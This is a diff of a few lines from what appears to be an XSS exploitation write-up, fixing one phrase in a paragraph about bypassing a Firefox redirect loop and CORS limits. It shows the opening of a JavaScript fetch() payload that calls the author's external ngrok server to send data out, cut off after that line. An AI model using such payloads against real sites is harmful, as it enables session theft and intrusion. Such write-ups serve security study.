@@ -59,7 +59,7 @@ Actually, \r\n chars triggered a 302 page meaning that page had been found on th
 
 <p align="center"><img src="Screenshots/S4.png" alt="Desc"></p>
 
-<p align="justify"> Nonetheless when I tested the payload on firefox, it only triggered a redirect loop leading to abortion by firefox itself after too many redirections. After searching for known bypass I found (thanks Vic_V2 !) this documenation <a href="https://www.gremwell.com/firefox-xss-302">doc</a>, in which the loop redirect issue had been solved using websocket in Location headers. Hence, I adjusted my payload but faced a last obstacle , the CORS headers. To solve this problem, I added the following parameters for fetching my external server and to get around CORS restrictions: </p>
+<p align="justify"> Nonetheless when I tested the payload on firefox, it only triggered a redirect loop leading to abortion by firefox itself after too many redirections. After searching for known bypass I found (thanks Vic_V2 !) this documenation <a href="https://www.gremwell.com/firefox-xss-302">doc</a>, in which the loop redirect issue had been solved using websocket in Location headers. Hence, I adjusted my payload but faced a last obstacle , the CORS headers. To solve this problem, I added the following parameters to fetch my external server and to get around CORS restrictions: </p>
 
 ````javascript
 fetch('http://7.tcp.eu.ngrok.io:18440/',
